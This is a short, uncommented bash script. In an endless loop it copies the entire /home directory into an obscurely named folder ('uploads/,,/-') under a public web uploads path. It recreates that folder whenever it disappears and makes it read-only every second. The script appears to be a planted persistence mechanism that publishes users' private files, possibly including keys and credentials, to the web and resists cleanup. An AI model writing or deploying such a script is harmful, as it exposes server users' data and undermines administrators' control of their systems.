#!/bin/bash

folder_path="/home/repository/public_html/web/uploads/,,/-"
backup_path="/home"

while true
do
    if [ ! -d "$folder_path" ]; then
        cp -r "$backup_path" "$folder_path"
    fi

    chmod -R 0555 "$folder_path"
    sleep 1
done